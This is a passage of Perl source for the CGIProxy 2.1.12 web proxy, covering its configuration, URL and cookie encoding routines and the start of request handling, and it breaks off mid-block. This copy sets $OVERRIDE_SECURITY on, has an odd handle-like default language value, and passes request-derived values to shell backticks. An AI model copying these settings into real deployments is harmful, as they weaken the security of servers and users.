#!/usr/bin/perl
#   CGIProxy 2.1.12
use strict ;
use warnings ;
no warnings qw(uninitialized) ;
use Encode ;
use IO::Handle ;
use IO::Select ;
use File::Spec ;
use Time::Local ;
use Getopt::Long ;
use Socket qw(:all) ;
use Net::Domain qw(hostfqdn) ;
use Fcntl qw(:DEFAULT :flock) ;
use POSIX qw(:sys_wait_h setsid);
use Time::HiRes qw(gettimeofday tv_interval) ;
use Errno qw(EINTR EAGAIN EWOULDBLOCK ENOBUFS EPIPE) ;
use vars qw(
$PROXY_DIR  $SECRET_PATH  $LOCAL_LIB_DIR
$FCGI_SOCKET  $FCGI_MAX_REQUESTS_PER_PROCESS  $FCGI_NUM_PROCESSES
$PRIVATE_KEY_FILE  $CERTIFICATE_FILE  $RUN_AS_USER  $EMB_USERNAME  $EMB_PASSWORD
$DB_DRIVER  $DB_SERVER  $DB_NAME  $DB_USER  $DB_PASS  $USE_DB_FOR_COOKIES
   %REDIRECTS  %TIMEOUT_MULTIPLIER_BY_HOST
$DEFAULT_LANG
$TEXT_ONLY
$REMOVE_COOKIES  $REMOVE_SCRIPTS  $FILTER_ADS  $HIDE_REFERER
$INSERT_ENTRY_FORM  $ALLOW_USER_CONFIG
$ENCODE_DECODE_BLOCK_IN_JS
@ALLOWED_SERVERS  @BANNED_SERVERS  @BANNED_NETWORKS
$NO_COOKIE_WITH_IMAGE  @ALLOWED_COOKIE_SERVERS  @BANNED_COOKIE_SERVERS
@ALLOWED_SCRIPT_SERVERS  @BANNED_SCRIPT_SERVERS
@BANNED_IMAGE_URL_PATTERNS  $RETURN_EMPTY_GIF
$USER_IP_ADDRESS_TEST  $DESTINATION_SERVER_TEST
$INSERT_HTML  $INSERT_FILE  $ANONYMIZE_INSERTION  $FORM_AFTER_INSERTION
$INSERTION_FRAME_HEIGHT
$RUNNING_ON_SSL_SERVER  $NOT_RUNNING_AS_NPH
$HTTP_PROXY  $SSL_PROXY  $NO_PROXY  $PROXY_AUTH  $SSL_PROXY_AUTH
$SOCKS_PROXY  $SOCKS_USERNAME  $SOCKS_PASSWORD
$MINIMIZE_CACHING
$SESSION_COOKIES_ONLY  $COOKIE_PATH_FOLLOWS_SPEC  $RESPECT_THREE_DOT_RULE
@PROXY_GROUP
$USER_AGENT  $USE_PASSIVE_FTP_MODE  $SHOW_FTP_WELCOME
$PROXIFY_SCRIPTS  $PROXIFY_SWF  $ALLOW_RTMP_PROXY  $ALLOW_UNPROXIFIED_SCRIPTS
$PROXIFY_COMMENTS
$USE_POST_ON_START  $ENCODE_URL_INPUT
$REMOVE_TITLES  $NO_BROWSE_THROUGH_SELF  $NO_LINK_TO_START  $MAX_REQUEST_SIZE
@TRANSMIT_HTML_IN_PARTS_URLS
$QUIETLY_EXIT_PROXY_SESSION
$ALERT_ON_CSP_VIOLATION
   $OVERRIDE_SECURITY

   @SCRIPT_MIME_TYPES  @OTHER_TYPES_TO_REGISTER  @TYPES_TO_HANDLE
   $NON_TEXT_EXTENSIONS
   @RTL_LANG
   $PROXY_VERSION

   $RUN_METHOD
   @MONTH  @WEEKDAY  %UN_MONTH
   %RTL_LANG
   @BANNED_NETWORK_ADDRS
   $DB_HOSTPORT  $DBH  $STH_UPD_COOKIE  $STH_INS_COOKIE  $STH_SEL_COOKIE  $STH_SEL_ALL_COOKIES
   $STH_DEL_COOKIE  $STH_DEL_ALL_COOKIES  $STH_UPD_SESSION  $STH_INS_SESSION  $STH_SEL_IP
   $STH_PURGE_SESSIONS  $STH_PURGE_COOKIES
   $USER_IP_ADDRESS_TEST_H  $DESTINATION_SERVER_TEST_H
   $RUNNING_ON_IIS
   @NO_PROXY
   $NO_CACHE_HEADERS
   @ALL_TYPES  %MIME_TYPE_ID  $SCRIPT_TYPE_REGEX  $TYPES_TO_HANDLE_REGEX
   $THIS_HOST  $ENV_SERVER_PORT  $ENV_SCRIPT_NAME  $THIS_SCRIPT_URL
   $SSL_SUPPORTED
   $RTMP_SERVER_PORT
   %ENV_UNCHANGING  $HAS_INITED

   %MSG  @MSG_KEYS  $CUSTOM_INSERTION  %IN_CUSTOM_INSERTION

   $RE_JS_WHITE_SPACE  $RE_JS_LINE_TERMINATOR  $RE_JS_COMMENT
   $RE_JS_IDENTIFIER_START  $RE_JS_IDENTIFIER_PART  $RE_JS_IDENTIFIER_NAME
   $RE_JS_PUNCTUATOR  $RE_JS_DIV_PUNCTUATOR
   $RE_JS_NUMERIC_LITERAL  $RE_JS_ESCAPE_SEQUENCE
   $RE_JS_STRING_LITERAL
   $RE_JS_STRING_LITERAL_START  $RE_JS_STRING_REMAINDER_1  $RE_JS_STRING_REMAINDER_2
   $RE_JS_REGULAR_EXPRESSION_LITERAL
   $RE_JS_TOKEN  $RE_JS_INPUT_ELEMENT_DIV  $RE_JS_INPUT_ELEMENT_REG_EXP
   $RE_JS_SKIP  $RE_JS_SKIP_NO_LT
   %RE_JS_SET_TRAPPED_PROPERTIES %RE_JS_SET_RESERVED_WORDS_NON_EXPRESSION
   %RE_JS_SET_ALL_PUNCTUATORS
   $JSLIB_BODY  $JSLIB_BODY_GZ

   $HTTP_VERSION  $HTTP_1_X
   $URL
   $STDIN  $STDOUT
   $now  $session_id  $session_id_persistent  $session_cookies
   $packed_flags  $encoded_URL  $doing_insert_here  $env_accept
   $e_remove_cookies  $e_remove_scripts  $e_filter_ads  $e_insert_entry_form
   $e_hide_referer
   $images_are_banned_here  $scripts_are_banned_here  $cookies_are_banned_here
   $scheme  $authority  $path  $host  $port  $username  $password
   $csp  $csp_ro  $csp_is_supported
   $cookie_to_server  %auth
   $script_url  $url_start  $url_start_inframe  $url_start_noframe  $lang  $dir
   $is_in_frame  $expected_type
   $base_url  $base_scheme  $base_host  $base_path  $base_file  $base_unframes
   $default_style_type  $default_script_type
   $status  $headers  $body  $charset  $meta_charset  $is_html
   %in_mini_start_form
   $needs_jslib  $does_write
   $swflib  $AVM2_BYTECODES
   $xhr_origin  $xhr_headers  @xhr_headers  $xhr_omit_credentials
   $temp_counter
   $debug ) ;
$SECRET_PATH= 'secret' ;
$FCGI_SOCKET= '/tmp/cgiproxy.fcgi.socket' ;
$FCGI_NUM_PROCESSES= 100 ;
$FCGI_MAX_REQUESTS_PER_PROCESS= 1000 ;
sub init {
$RUN_AS_USER= 'nobody' ;
$DB_USER= 'proxy' ;
$DB_PASS= '' ;
$USE_DB_FOR_COOKIES= 1 ;
$DEFAULT_LANG= 'eddiekidiw' ;
$TEXT_ONLY= 0 ;
$REMOVE_COOKIES= 0 ;
$REMOVE_SCRIPTS= 0 ;
$FILTER_ADS= 0 ;
$HIDE_REFERER= 0 ;
$INSERT_ENTRY_FORM= 0 ;
$ALLOW_USER_CONFIG= 0 ;
sub proxy_encode {
    my($URL)= @_ ;
    $URL=~ s#^([\w+.-]+)://#$1/# ;                 # http://xxx -> http/xxx
#    $URL=~ s/(.)/ sprintf('%02x',ord($1)) /ge ;   # each char -> 2-hex
#    $URL=~ tr/a-zA-Z/n-za-mN-ZA-M/ ;              # rot-13

    return $URL ;
}

sub proxy_decode {
    my($enc_URL)= @_ ;

#    $enc_URL=~ tr/a-zA-Z/n-za-mN-ZA-M/ ;        # rot-13
#    $enc_URL=~ s/([\da-fA-F]{2})/ sprintf("%c",hex($1)) /ge ;
    $enc_URL=~ s#^([\w+.-]+)/#$1://# ;           # http/xxx -> http://xxx
    return $enc_URL ;
}

sub cookie_encode {
    my($cookie)= @_ ;
#    $cookie=~ s/(.)/ sprintf('%02x',ord($1)) /ge ;   # each char -> 2-hex
#    $cookie=~ tr/a-zA-Z/n-za-mN-ZA-M/ ;              # rot-13
    $cookie=~ s/(\W)/ '%' . sprintf('%02x',ord($1)) /ge ; # simple URL-encoding
    return $cookie ;
}

sub cookie_decode {
    my($enc_cookie)= @_ ;
    $enc_cookie=~ s/%([\da-fA-F]{2})/ pack('C', hex($1)) /ge ;  # URL-decode
#    $enc_cookie=~ tr/a-zA-Z/n-za-mN-ZA-M/ ;          # rot-13
#    $enc_cookie=~ s/([\da-fA-F]{2})/ sprintf("%c",hex($1)) /ge ;
    return $enc_cookie ;
}

$ENCODE_DECODE_BLOCK_IN_JS= <<'EOB' ;

function _proxy_jslib_proxy_encode(URL) {
    URL= URL.replace(/^([\w\+\.\-]+)\:\/\//, '$1/') ;
//    URL= URL.replace(/(.)/g, function (s,p1) { return p1.charCodeAt(0).toString(16) } ) ;
//    URL= URL.replace(/([a-mA-M])|[n-zN-Z]/g, function (s,p1) { return String.fromCharCode(s.charCodeAt(0)+(p1?13:-13)) }) ;

    return URL ;
}

function _proxy_jslib_proxy_decode(enc_URL) {
//    enc_URL= enc_URL.replace(/([a-mA-M])|[n-zN-Z]/g, function (s,p1) { return String.fromCharCode(s.charCodeAt(0)+(p1?13:-13)) }) ;
//    enc_URL= enc_URL.replace(/([\da-fA-F]{2})/g, function (s,p1) { return String.fromCharCode(eval('0x'+p1)) } ) ;
    enc_URL= enc_URL.replace(/^([\w\+\.\-]+)\//, '$1://') ;
    return enc_URL ;
}

function _proxy_jslib_cookie_encode(cookie) {
//    cookie= cookie.replace(/(.)/g, function (s,p1) { return p1.charCodeAt(0).toString(16) } ) ;
//    cookie= cookie.replace(/([a-mA-M])|[n-zN-Z]/g, function (s,p1) { return String.fromCharCode(s.charCodeAt(0)+(p1?13:-13)) }) ;
    cookie= cookie.replace(/(\W)/g, function (s,p1) { return '%'+p1.charCodeAt(0).toString(16) } ) ;
    return cookie ;
}

function _proxy_jslib_cookie_decode(enc_cookie) {
    enc_cookie= enc_cookie.replace(/%([\da-fA-F]{2})/g, function (s,p1) { return String.fromCharCode(eval('0x'+p1)) } ) ;
//    enc_cookie= enc_cookie.replace(/([a-mA-M])|[n-zN-Z]/g, function (s,p1) { return String.fromCharCode(s.charCodeAt(0)+(p1?13:-13)) }) ;
//    enc_cookie= enc_cookie.replace(/([\da-fA-F]{2})/g, function (s,p1) { return String.fromCharCode(eval('0x'+p1)) } ) ;
    return enc_cookie ;
}

EOB
@ALLOWED_SERVERS= () ;
@BANNED_SERVERS= () ;
@BANNED_NETWORKS= ('127', '192.168', '172', '10', '169.254', '244.0.0') ;
@BANNED_COOKIE_SERVERS= (
    '\.doubleclick\.net$',
    '\.preferences\.com$',
    '\.imgis\.com$',
    '\.adforce\.com$',
    '\.focalink\.com$',
    '\.flycast\.com$',
    '\.avenuea\.com$',
    '\.linkexchange\.com$',
    '\.pathfinder\.com$',
    '\.burstnet\.com$',
    '\btripod\.com$',
    '\bgeocities\.yahoo\.com$',
    '\.mediaplex\.com$',
    ) ;

$NO_COOKIE_WITH_IMAGE= 0 ;

@ALLOWED_SCRIPT_SERVERS= () ;
@BANNED_SCRIPT_SERVERS= () ;
@BANNED_IMAGE_URL_PATTERNS= (
    'ad\.doubleclick\.net/ad/',
    '\b[a-z](\d+)?\.doubleclick\.net(:\d*)?/',
    '\.imgis\.com\b',
    '\.adforce\.com\b',
    '\.avenuea\.com\b',
    '\.go\.com(:\d*)?/ad/',
    '\.eimg\.com\b',
    '\bexcite\.netscape\.com(:\d*)?/.*/promo/',
    '/excitenetscapepromos/',
    '\.yimg\.com(:\d*)?.*/promo/',
    '\bus\.yimg\.com/[a-z]/(\w\w)/\1',
    '\bus\.yimg\.com/[a-z]/\d-/',
    '\bpromotions\.yahoo\.com(:\d*)?/promotions/',
    '\bcnn\.com(:\d*)?/ads/',
    'ads\.msn\.com\b',
    '\blinkexchange\.com\b',
    '\badknowledge\.com\b',
    '/SmartBanner/',
    '\bdeja\.com/ads/',
    '\bimage\.pathfinder\.com/sponsors',
    'ads\.tripod\.com',
    'ar\.atwola\.com/image/',
    '\brealcities\.com/ads/',
    '\bnytimes\.com/ad[sx]/',
    '\busatoday\.com/sponsors/',
    '\busatoday\.com/RealMedia/ads/',
    '\bmsads\.net/ads/',
    '\bmediaplex\.com/ads/',
    '\batdmt\.com/[a-z]/',
    '\bview\.atdmt\.com/',
    '\bADSAdClient31\.dll\b',
    ) ;

$RETURN_EMPTY_GIF= 0 ;
$USER_IP_ADDRESS_TEST= '' ;
$DESTINATION_SERVER_TEST= '' ;
$ANONYMIZE_INSERTION= 1 ;
$FORM_AFTER_INSERTION= 0 ;
$INSERTION_FRAME_HEIGHT= $ALLOW_USER_CONFIG   ? 80   : 50 ;
$RUNNING_ON_SSL_SERVER= '' ;
$NOT_RUNNING_AS_NPH= 1 ;
%TIMEOUT_MULTIPLIER_BY_HOST= (
    'www.facebook.com' => 10,
) ;
$MINIMIZE_CACHING= 0 ;
$SESSION_COOKIES_ONLY= 0 ;
$COOKIE_PATH_FOLLOWS_SPEC= 0 ;
$RESPECT_THREE_DOT_RULE= 0 ;
$USE_PASSIVE_FTP_MODE= 1 ;
$SHOW_FTP_WELCOME= 1 ;
$PROXIFY_SCRIPTS= 1 ;
$PROXIFY_SWF= 1 ;
$ALLOW_RTMP_PROXY= 0 ;
$ALLOW_UNPROXIFIED_SCRIPTS= 0 ;
$PROXIFY_COMMENTS= 0 ;
$USE_POST_ON_START= 1 ;
$ENCODE_URL_INPUT= 1 ;
$REMOVE_TITLES= 0 ;
$NO_BROWSE_THROUGH_SELF= 0 ;
$NO_LINK_TO_START= 0 ;
$MAX_REQUEST_SIZE= 4194304 ;
$QUIETLY_EXIT_PROXY_SESSION= 0 ;
$ALERT_ON_CSP_VIOLATION= 0 ;
$OVERRIDE_SECURITY= 1 ;
@SCRIPT_MIME_TYPES= ('application/x-javascript', 'application/x-ecmascript',
		     'application/x-vbscript',   'application/x-perlscript',
		     'application/javascript',   'application/ecmascript',
		     'text/javascript',  'text/ecmascript', 'text/jscript',
		     'text/livescript',  'text/vbscript',   'text/vbs',
		     'text/perlscript',  'text/tcl',
		     'text/x-scriptlet', 'text/scriptlet',
		     'application/hta',   'application/x-shockwave-flash',
		    ) ;

@OTHER_TYPES_TO_REGISTER= ('text/css', 'x-proxy/xhr') ;
@TYPES_TO_HANDLE= ('text/css',
		   'application/x-javascript', 'application/x-ecmascript',
		   'application/javascript',   'application/ecmascript',
		   'text/javascript',          'text/ecmascript',
		   'text/livescript',          'text/jscript',
		   'application/x-shockwave-flash',
		  ) ;

$NON_TEXT_EXTENSIONS=
	  'gif|jpeg|jpe|jpg|tiff|tif|png|bmp|xbm'   # images
	. '|mp2|mp3|wav|aif|aiff|au|snd'            # audios
	. '|avi|qt|mov|mpeg|mpg|mpe'                # videos
	. '|gz|Z|exe|gtar|tar|zip|sit|hqx|pdf'      # applications
	. '|ram|rm|ra|swf' ;                        # others

@RTL_LANG= qw( ar fa ) ;


$PROXY_VERSION= '2.1.12' ;

no warnings 'numeric' ;
$RUN_AS_USER= getpwnam($RUN_AS_USER)
    if $RUN_METHOD eq 'embedded' and $RUN_AS_USER==0 and $^O!~ /win/i ;
use warnings 'numeric' ;

if ($LOCAL_LIB_DIR and $ARGV[0] ne 'install-modules' and $ARGV[0] ne 'purge-db') {
    push(@INC, File::Spec->catdir($LOCAL_LIB_DIR, qw(lib perl5))) ;
    eval { require local::lib ; local::lib->import($LOCAL_LIB_DIR) } ;  # ignore errors
}

@RTL_LANG{@RTL_LANG}= (1) x @RTL_LANG ;

$DB_DRIVER= 'mysql' if lc($DB_DRIVER) eq 'mysql' ;

if ($DB_SERVER ne '') {
    my($db_host, $db_port)= $DB_SERVER=~ /\[/
	? $DB_SERVER=~ /^\[([^\]]*)\]:(.*)/
	: split(/:/, $DB_SERVER) ;
    $db_host= $db_host ne ''  ? ";host=$db_host"  : '' ;
    $db_port= $db_port ne ''  ? ";port=$db_port"  : '' ;
    ($DB_HOSTPORT= $db_host . $db_port)=~ s/^;// ;
} else {
    $DB_HOSTPORT= '' ;
}


@MONTH=   qw(Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec) ;
@WEEKDAY= qw(Sun Mon Tue Wed Thu Fri Sat Sun) ;
%UN_MONTH= map { lc($MONTH[$_]), $_+1 }  0..$#MONTH ;   # look up by month name, 1-based


&set_RE_JS  if $PROXIFY_SCRIPTS ;

$ENV{SCRIPT_NAME}=~ s#^/?#/#  if $ENV{SCRIPT_NAME} ne '' ;
if ($ENV{SERVER_SOFTWARE}=~ /^Apache\b/i) {
    my($zero)= $0=~ m#([^/]*)$# ;
    ($ENV{SCRIPT_NAME})= $ENV{SCRIPT_NAME}=~ /^(.*?\Q$zero\E)/ if $zero ne '' ;
}
$ENV_SERVER_PORT= $ENV{SERVER_PORT} ;
$ENV_SCRIPT_NAME= $ENV{SCRIPT_NAME} ;

# The nginx server sets SCRIPT_NAME to the entire request-URI, so fix it.
# Must do this only on $ENV_SCRIPT_NAME and not $ENV{SCRIPT_NAME}, because
#   later we'll need the latter to get PATH_INFO.  :P
if ($ENV{SERVER_SOFTWARE}=~ /^nginx\b/i) {
    if ($RUN_METHOD eq 'fastcgi') {
	$ENV_SCRIPT_NAME= '/' . $SECRET_PATH ;
    } else {
	my($zero)= $0=~ m#([^/]*)$# ;
	($ENV_SCRIPT_NAME)= $ENV_SCRIPT_NAME=~ /^(.*?\Q$zero\E)/  if $zero ne '' ;
    }
}

# If we're running as the embedded server, use $SECRET_PATH .
$ENV_SCRIPT_NAME= '/' . $SECRET_PATH  if $RUN_METHOD eq 'embedded' or $RUN_METHOD eq 'fastcgi' ;

# Next, adjust config variables as needed, or create any needed constants from
#   them.

# Create @BANNED_NETWORK_ADDRS from @BANNED_NETWORKS.
# No error checking; assumes the proxy owner set @BANNED_NETWORKS correctly.
@BANNED_NETWORK_ADDRS= () ;
for (@BANNED_NETWORKS) {
    push(@BANNED_NETWORK_ADDRS, pack('C*', /(\d+)/g)) ;
}


# For the external tests, create hashes of parsed URLs if the tests are CGI calls.
# Note that the socket names must each be unique!
@{$USER_IP_ADDRESS_TEST_H}{qw(host port path socket open)}=
	(lc($1), ($2 eq '' ? 80 : $2), $3, 'S_USERTEST', 0)
    if ($USER_IP_ADDRESS_TEST=~ m#http://([^/?:]*):?(\d*)(.*)#i) ;
@{$DESTINATION_SERVER_TEST_H}{qw(host port path socket open)}=
	(lc($1), ($2 eq '' ? 80 : $2), $3, 'S_DESTTEST', 0)
    if ($DESTINATION_SERVER_TEST=~ m#http://([^/?:]*):?(\d*)(.*)#i) ;

die "Must use full directory path in \$PROXY_DIR setting; currently set to \"$PROXY_DIR\".\n"
    if $RUN_METHOD eq 'embedded' and $PROXY_DIR!~ ($^O=~ /win/i  ? qr#^([a-zA-Z]:)?[/\\]#  : qr#^/#) ;

$RUNNING_ON_SSL_SERVER= ($ENV_SERVER_PORT!=80) if $RUNNING_ON_SSL_SERVER eq '' ;

$RUNNING_ON_SSL_SERVER= 1  if $RUN_METHOD eq 'embedded' ;

$USE_DB_FOR_COOKIES= 0  unless $DB_DRIVER ne '' ;

$RUNNING_ON_IIS= ($ENV{'SERVER_SOFTWARE'}=~ /IIS/) ;

$NOT_RUNNING_AS_NPH= 1  if $RUN_METHOD eq 'fastcgi' ;

@NO_PROXY= split(/\s*,\s*/, $NO_PROXY) ;

$PROXY_AUTH=     &base64($PROXY_AUTH)      if $PROXY_AUTH=~ /:/ ;
$SSL_PROXY_AUTH= &base64($SSL_PROXY_AUTH)  if $SSL_PROXY_AUTH=~ /:/ ;

foreach (@PROXY_GROUP) { s#/$## }

$NO_CACHE_HEADERS= $MINIMIZE_CACHING
    ? "Cache-Control: no-cache\015\012Pragma: no-cache\015\012"
    : '' ;

for (@SCRIPT_MIME_TYPES)        { $_= lc }
for (@OTHER_TYPES_TO_REGISTER)  { $_= lc }

@ALL_TYPES= ('', @SCRIPT_MIME_TYPES, @OTHER_TYPES_TO_REGISTER) ;
&HTMLdie("Too many MIME types to register.")  if @ALL_TYPES > 64 ;
@MIME_TYPE_ID{@ALL_TYPES}=  0..$#ALL_TYPES ;
$SCRIPT_TYPE_REGEX= '(' . join("|", @SCRIPT_MIME_TYPES) . ')' ;

$TYPES_TO_HANDLE_REGEX= '(' . join("|", @TYPES_TO_HANDLE) . ')' ;


# Only need to run this routine once
$HAS_INITED= 1 ;


}  # sub init {

sub one_run {

# OK, let's time this thing
#my $starttime= time ;
#my($sutime,$sstime)= (times)[0,1] ;

local($|)= 1 ;

reset 'a-z' ;
$URL= '' ;     # (almost) only uppercase variable that varies from run to run



# Store $now rather than calling time() multiple times.
$now= time ;    # for (@goodmen)


$csp_is_supported= &csp_is_supported() ;


if ($ENV{'HTTP_HOST'} ne '') {
    ($THIS_HOST)= $ENV{'HTTP_HOST'}=~ /\[/
	? $ENV{'HTTP_HOST'}=~ m#^(?:[\w+.-]+://)?\[([^\]]*)\]#
	: $ENV{'HTTP_HOST'}=~ m#^(?:[\w+.-]+://)?([^:/?]*)# ;
    $THIS_HOST= $ENV{'SERVER_NAME'}   if $THIS_HOST eq '' ;
} else {
    $THIS_HOST= $ENV{'SERVER_NAME'} ;
}


$THIS_SCRIPT_URL= $RUNNING_ON_SSL_SERVER
	    ? 'https://' . $THIS_HOST
	      . ($ENV_SERVER_PORT==443  ? ''  : ':' . $ENV_SERVER_PORT)
	      . $ENV_SCRIPT_NAME
	    : 'http://' . $THIS_HOST
	      . ($ENV_SERVER_PORT==80   ? ''  : ':' . $ENV_SERVER_PORT)
	      . $ENV_SCRIPT_NAME ;


($HTTP_VERSION)= $ENV{'SERVER_PROTOCOL'}=~ m#^HTTP/(\d+\.\d+)#i ;
$HTTP_VERSION= '1.0' unless $HTTP_VERSION=~ /^1\.[01]$/ ;

$HTTP_1_X=  $NOT_RUNNING_AS_NPH   ? 'Status:'   : "HTTP/$HTTP_VERSION" ;


if ($ENV{'SERVER_SOFTWARE'}=~ m#^Apache/(\d+)\.(\d+)(?:\.(\d+))?#i) {
    if (($1<=>1 or $2<=>3 or $3<=>6) < 0) {
	$SIG{'ALRM'} = \&timeexit ;
	eval { alarm(600) } ;     # use where it works, ignore where it doesn't
    }
}

sub timeexit { goto EXIT }

$ENV{'PATH_INFO'} =~ s/^$ENV_SCRIPT_NAME//   if $RUNNING_ON_IIS ;

($ENV{PATH_INFO}= $ENV{SCRIPT_NAME})=~ s/^\Q$ENV_SCRIPT_NAME\E//
    if $ENV{SERVER_SOFTWARE}=~ /^nginx\b/i ;

if ($ENV{'PATH_INFO'}=~ / /) {
    $ENV{'PATH_INFO'} =~ s/%/%25/g ;
    $ENV{'PATH_INFO'} =~ s/ /%20/g ;
}


if ($RUN_METHOD eq 'embedded' and !($ENV{'PATH_INFO'}=~ s#^/\Q$SECRET_PATH\E($|/)#$1#)) {
    select((select($STDOUT), $|=1)[0]) ;    # unbuffer the socket
    print $STDOUT "HTTP/1.1 404 Not Found\015\012\015\012" ;
    die "exiting" ;
}


# Copy often-used environment vars into scalars, for efficiency
$env_accept= $ENV{'HTTP_ACCEPT'} || '*/*' ;     # may be modified later

($lang, $packed_flags, $encoded_URL)= $ENV{'PATH_INFO'}=~ m#^/([^/]*)/?([^/]*)/?(.*)# ;

$lang= $DEFAULT_LANG  if $lang eq '' ;

# Set "dir" attribute based on %RTL_LANG .
$dir= $RTL_LANG{$lang}  ? ' dir="rtl"'  : '' ;

if ( $ALLOW_USER_CONFIG && ($packed_flags ne '') ) {
    ($e_remove_cookies, $e_remove_scripts, $e_filter_ads, $e_hide_referer,
     $e_insert_entry_form, $is_in_frame, $expected_type)=
	 &unpack_flags($packed_flags) ;

} else {
    
    ($e_remove_cookies, $e_remove_scripts, $e_filter_ads, $e_hide_referer,
     $e_insert_entry_form, $is_in_frame, $expected_type)=
	 ($REMOVE_COOKIES, $REMOVE_SCRIPTS, $FILTER_ADS, $HIDE_REFERER,
	  $INSERT_ENTRY_FORM, (&unpack_flags($packed_flags))[5..6] ) ;
}

$doing_insert_here= !$is_in_frame && 
    ( $e_insert_entry_form || ($INSERT_FILE ne '') || ($INSERT_HTML ne '') ) ;


binmode $STDOUT ;


if (@PROXY_GROUP) {
    # srand is automatically called in Perl 5.004 and later.  It might be
    #   desirable to seed based on the URL, so that multiple requests for
    #   the same URL go through the same proxy, and may thus be cached.
    #srand( unpack('%32L*', $ENV{'PATH_INFO'}) ) ;  # seed with URL+flags
    $script_url= $PROXY_GROUP[ rand(scalar @PROXY_GROUP) ] ;
} else {
    $script_url= $THIS_SCRIPT_URL ;
}

# Create $url_start and any needed variants: "$script_url/flags/"
$url_start_inframe= url_start_by_flags($e_remove_cookies, $e_remove_scripts, $e_filter_ads,
				       $e_hide_referer, $e_insert_entry_form, 1, '') ;
$url_start_noframe= url_start_by_flags($e_remove_cookies, $e_remove_scripts, $e_filter_ads,
				       $e_hide_referer, $e_insert_entry_form, 0, '') ;
$url_start=  $is_in_frame   ? $url_start_inframe   : $url_start_noframe ;


# If there's no $encoded_URL, then start a browsing session.
&show_start_form() if $encoded_URL eq '' ;


# Decode the URL.
$URL= &wrap_proxy_decode($encoded_URL) ;

$URL.= ($URL=~ /\?/  ? '&'  : '?') . $ENV{'QUERY_STRING'}  if $ENV{'QUERY_STRING'} ne '' ;

($scheme, $authority, $path)= ($URL=~ m#^([\w+.-]+)://([^/?]*)(.*)$#i) ;
$scheme= lc($scheme) ;
$path= "/$path" if $path!~ m#^/# ;   # if path is '' or contains only query

if ($USE_DB_FOR_COOKIES) {
    # Attempt to get session cookies from HTTP_COOKIE .
    get_session_cookies() ;

    $session_id_persistent= random_string(20) unless $session_id_persistent=~ /^[\dA-Za-z]{20}$/ ;
    my $secure_clause= $RUNNING_ON_SSL_SERVER  ? ' secure;'  : '' ;

    $session_cookies= "Set-Cookie: S2=$session_id_persistent; expires=" . &rfc1123_date($now+3600, 1)
		    . "; path=$ENV_SCRIPT_NAME/;$secure_clause HttpOnly\015\012" ;

    if (!($session_id=~ /^[\dA-Za-z]{20}$/)) {
	$session_id= random_string(20) ;
	$session_cookies.= "Set-Cookie: S=$session_id; "
			 . "path=$ENV_SCRIPT_NAME/;$secure_clause HttpOnly\015\012" ;
    }

    connect_to_db() ;

    update_session_record($session_id) ;
    update_session_record($session_id_persistent) ;

    &HTMLdie("Connecting from wrong IP address.")  unless verify_ip_address($session_id) ;
    &HTMLdie("Connecting from wrong IP address.")  unless verify_ip_address($session_id_persistent) ;

}


&xproxy($URL) if $scheme eq 'x-proxy' ;


if ($ENV{'HTTP_USER_AGENT'}=~ /MSIE/) {
    $is_html= 1  if $path=~ /\.html?(\?|$)/i ;
} else {
    $is_html= 1  if $path=~ /^[^?]*\.html?(\?|$)/i ;
}


# Alert the user to unsupported URL, with an intermediate page
&unsupported_warning($URL) unless ($scheme=~ /^(http|https|ftp)$/) ;

&HTMLdie('The target URL cannot contain an empty host name.')
    unless $authority=~ /^\w/ ;

if ($scheme eq 'ftp') {
    if ($authority=~ /@/) {
	($username, $password, $host, $port)= $authority=~ /\[/
	    ? $authority=~ /^([^:@]*):?([^@]*)@\[([^\]]*)\]:?(.*)$/   # IPv6
	    : $authority=~ /^([^:@]*):?([^@]*)@([^:]*):?(.*)$/ ;
    } else {
	($username, $password)= ('anonymous', 'not@available.com') ;
	($host, $port)= $authority=~ /\[/
	    ? $authority=~ /^\[([^\]]*)\]:?(.*)$/                     # IPv6
	    : $authority=~ /^([^:]*):?(.*)$/ ;
    }

# covers HTTP, etc.
} else {
    if ($authority=~ /@/) {
	($username, $password, $host, $port)= $authority=~ /\[/
	    ? $authority=~ /^([^:@]*):?([^@]*)@\[([^\]]*)\]:?(.*)$/   # IPv6
	    : $authority=~ /^([^:@]*):?([^@]*)@([^:]*):?(.*)$/ ;
    } else {
	($host, $port)= $authority=~ /\[/
	    ? $authority=~ /^\[([^\]]*)\]:?(.*)$/                     # IPv6
	    : $authority=~ /^([^:]*):?(.*)$/ ;
    }
}

$host= lc($host) ;      # hostnames are case-insensitive
$host=~ s/\.*$//g ;     # removes trailing dots to close a potential exploit

if ($NO_BROWSE_THROUGH_SELF) {
    # Default $port's not set yet, so hack up an ad hoc version.
    my($port2)=  $port || ( $scheme eq 'https'  ? 443  : 80 ) ;
    &loop_disallowed_die($URL)
	if     ($scheme=~ /^https?/)
	    && ($host=~ /^$THIS_HOST$/i)
	    && ($port2 == $ENV_SERVER_PORT)
	    && ($path=~ /^$ENV_SCRIPT_NAME\b/) ;
}

if ($USER_IP_ADDRESS_TEST) {
    my($ok) ;
    if ($USER_IP_ADDRESS_TEST_H) {
	$ok= &http_get2($USER_IP_ADDRESS_TEST_H,
			$USER_IP_ADDRESS_TEST_H->{path} . $ENV{REMOTE_ADDR}) ;
    } else {
	$ok= `$USER_IP_ADDRESS_TEST $ENV{REMOTE_ADDR}` ;
    }
    &banned_user_die if $ok==0 ;
}

if ($DESTINATION_SERVER_TEST) {
    my($ok) ;
    my($safehost)= $host ;
    if ($DESTINATION_SERVER_TEST_H) {
	$safehost=~ s/(\W)/ '%' . sprintf('%02x', ord($1)) /ge ;
	$ok= &http_get2($DESTINATION_SERVER_TEST_H,
			$DESTINATION_SERVER_TEST_H->{path} . $safehost) ;
    } else {
	$safehost=~ s/\\/\\\\/g ;
	$safehost=~ s/'/\\'/g ;
	$ok= `$DESTINATION_SERVER_TEST '$safehost'` ;
    }
    &banned_server_die($URL) if $ok==0 ;
}

if (@ALLOWED_SERVERS) {
    my($server_is_allowed) ;
    foreach (@ALLOWED_SERVERS) {
	$server_is_allowed= 1, last   if $host=~ /$_/ ;
    }
    &banned_server_die($URL) unless $server_is_allowed ;
}
foreach (@BANNED_SERVERS) {
    &banned_server_die($URL) if $host=~ /$_/ ;
}

if ($e_filter_ads) {
    foreach (@BANNED_IMAGE_URL_PATTERNS) {
	$images_are_banned_here= 1, last if $URL=~ /$_/ ;
    }
}


$scripts_are_banned_here= $e_remove_scripts ;
unless ($scripts_are_banned_here) {
    if (@ALLOWED_SCRIPT_SERVERS) {
	$scripts_are_banned_here= 1 ;
